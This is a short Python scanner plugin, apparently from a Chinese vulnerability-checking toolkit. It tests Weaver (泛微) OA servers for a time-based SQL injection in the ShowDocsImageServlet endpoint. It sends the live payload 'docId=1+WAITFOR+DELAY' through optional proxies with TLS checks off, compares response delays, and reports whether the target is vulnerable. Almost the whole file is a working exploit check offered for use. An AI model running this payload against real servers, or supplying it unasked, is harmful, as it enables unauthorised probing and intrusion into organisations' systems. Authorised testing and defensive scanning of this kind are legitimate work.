import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        base_path = "weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1"
        inject_path = "weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1+WAITFOR+DELAY+'0%3a0%3a5'"
        base_resp = requests.get(url1+base_path,cookies=s_cookie,proxies=proxies,headers=headers, verify=False,timeout=15)
        inject_resp = requests.get(url1+inject_path,cookies=s_cookie,proxies=proxies,headers=headers, verify=False,timeout=15)
        base_time = base_resp.elapsed.total_seconds()
        inject_time = inject_resp.elapsed.total_seconds()
        if ((inject_time - base_time) >= 4.5 and (inject_time - base_time) <= 5.5 or (inject_time - base_time) >= 9.5 and (inject_time - base_time) <= 10.5) and base_resp.status_code == 200 and inject_resp.status_code == 200 and 'image' in inject_resp.headers.get('Content-Type'):
            cdd="[+]漏洞存在\nweaver/weaver.docs.docs.ShowDocsImageServlet?docId=1+WAITFOR+DELAY+'0%3a0%3a5'"
        else:
            cdd='[-]漏洞不存在\n'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ 泛微 ShowDocsImageServletSQL注入 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)